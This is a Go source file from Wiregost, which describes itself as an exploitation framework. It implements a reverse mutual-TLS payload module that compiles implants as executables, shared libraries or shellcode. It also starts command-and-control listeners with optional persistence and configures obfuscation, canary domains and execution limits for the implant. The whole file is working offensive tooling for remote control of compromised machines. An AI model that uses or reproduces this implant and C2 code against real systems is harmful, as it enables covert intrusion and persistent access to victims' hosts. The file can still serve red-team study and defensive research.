// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package reverse_mtls

import (
	"errors"
	"fmt"
	"strconv"
	"strings"

	"github.com/evilsocket/islazy/tui"
	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	c2 "github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseMTLS - A single stage MTLS implant
type ReverseMTLS struct {
	*module.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseMTLS {
	mod := &ReverseMTLS{&module.Module{}}
	mod.Path = []string{"payload/multi/single/reverse_mtls"}
	return mod
}

var modLog = log.ServerLogger("payload/multi/single/reverse_mtls", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseMTLS) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case "run":
		return s.CompileImplant()
	case "to_listener":
		return s.toListener()
	case "parse_profile":
		return s.parseProfile(command)
	case "to_profile":
		return s.generateProfile(command)
	}

	return "", nil
}

func (s *ReverseMTLS) CompileImplant() (result string, err error) {
	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	go generate.CompileGhost(*c)

	return fmt.Sprintf("Started compiling mTLS implant"), nil
}

func (s *ReverseMTLS) toListener() (result string, err error) {
	host := s.Options["LHost"].Value
	portUint, _ := strconv.Atoi(s.Options["LPort"].Value)
	port := uint16(portUint)

	ln, err := c2.StartMutualTLSListener(host, port)
	if err != nil {
		return "", err
	}

	// Persistence
	persist := ""
	if s.Options["Persist"].Value == "true" {
		persist = fmt.Sprintf("%s[P]%s ", tui.GREEN, tui.RESET)
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "mTLS",
		Description: fmt.Sprintf("%sMutual TLS listener", persist),
		Protocol:    "tcp",
		Port:        port,
		JobCtrl:     make(chan bool),
	}

	// Save persist
	if s.Options["Persist"].Value == "true" {
		err := c2.PersistMTLS(job, host)
		if err != nil {
			s.ModuleEvent("Error saving persistence: " + err.Error())
		}
	}

	go func() {
		<-job.JobCtrl
		modLog.Infof("Stopping mTLS listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	return fmt.Sprintf("Reverse Mutual TLS listener started at %s:%d", host, port), nil
}

func (s *ReverseMTLS) parseProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	profile, err := generate.ProfileByName(profileName)
	if err != nil {
		return "", err
	}

	// C2
	if profile.MTLSc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "mtls") {
				url := strings.TrimPrefix(d.URL, "mtls://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsMTLS"].Value = strings.Join(urls, ",")
	}

	// Canaries
	if len(profile.CanaryDomains) != 1 {
		domains := []string{}
		for _, d := range profile.CanaryDomains {
			domains = append(domains, d)
		}
		s.Options["Canaries"].Value = strings.Join(domains, ",")
	}

	// Format
	switch profile.Format {
	case 0:
		s.Options["Format"].Value = "shared"
	case 1:
		s.Options["Format"].Value = "shellcode"
	case 2:
		s.Options["Format"].Value = "exe"
	}

	// Other fields
	s.Options["Arch"].Value = profile.GOARCH
	s.Options["OS"].Value = profile.GOOS
	s.Options["MaxErrors"].Value = strconv.Itoa(profile.MaxConnectionErrors)
	s.Options["ObfuscateSymbols"].Value = strconv.FormatBool(profile.ObfuscateSymbols)
	s.Options["Debug"].Value = strconv.FormatBool(profile.Debug)
	s.Options["LimitHostname"].Value = profile.LimitHostname
	s.Options["LimitUsername"].Value = profile.LimitUsername
	s.Options["LimitDatetime"].Value = profile.LimitDatetime
	s.Options["LimitDomainJoined"].Value = strconv.FormatBool(profile.LimitDomainJoined)
	s.Options["ReconnectInterval"].Value = strconv.Itoa(profile.ReconnectInterval)

	return fmt.Sprintf("Profile %s parsed", profile.Name), nil
}

func (s *ReverseMTLS) generateProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	// Save profile
	c.Name = profileName
	if 0 < len(c.Name) && c.Name != "." {
		modLog.Infof("Saving new profile with name %#v", c.Name)
		err = generate.ProfileSave(c.Name, c)
	} else {
		err = errors.New("Invalid profile name")
		return "", err
	}

	return fmt.Sprintf("Saved reverse DNS implant profile with name %#v", c.Name), nil
}

func (s *ReverseMTLS) ToGhostConfig() (c *generate.GhostConfig, err error) {
	c = &generate.GhostConfig{}

	// OS
	targetOS := s.Options["OS"].Value
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}

	// Arch
	arch := s.Options["Arch"].Value
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	// Format
	var outputFormat pb.GhostConfig_OutputFormat
	format := s.Options["Format"].Value
	switch format {
	case "shared":
		outputFormat = pb.GhostConfig_SHARED_LIB
		c.IsSharedLib = true
	case "shellcode":
		outputFormat = pb.GhostConfig_SHELLCODE
		c.IsSharedLib = true
	case "exe":
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	default:
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	}

	// MTLS C2
	c2s := generate.ParseMTLSc2(s.Options["DomainsMTLS"].Value)
	if len(c2s) == 0 {
		return nil, errors.New("You must specify at least one mTLS C2 endpoint")
	}

	// Canary Domains
	canaries := strings.Split(s.Options["Canaries"].Value, ",")
	if canaries[0] != "" {
		c.CanaryDomains = strings.Split(s.Options["Canaries"].Value, ",")
	}

	// Populate fields
	c.GOOS = targetOS
	c.GOARCH = arch
	c.Format = outputFormat
	c.C2 = c2s
	c.MTLSc2Enabled = true
	c.Debug, _ = strconv.ParseBool(s.Options["Debug"].Value)
	c.ObfuscateSymbols, _ = strconv.ParseBool(s.Options["ObfuscateSymbols"].Value)
	c.MaxConnectionErrors, _ = strconv.Atoi(s.Options["MaxErrors"].Value)
	c.ReconnectInterval, _ = strconv.Atoi(s.Options["ReconnectInterval"].Value)
	c.LimitDomainJoined, _ = strconv.ParseBool(s.Options["LimitDomainJoined"].Value)
	c.LimitHostname = s.Options["LimitHostname"].Value
	c.LimitUsername = s.Options["LimitUsername"].Value
	c.LimitDatetime = s.Options["LimitDatetime"].Value

	return c, nil
}
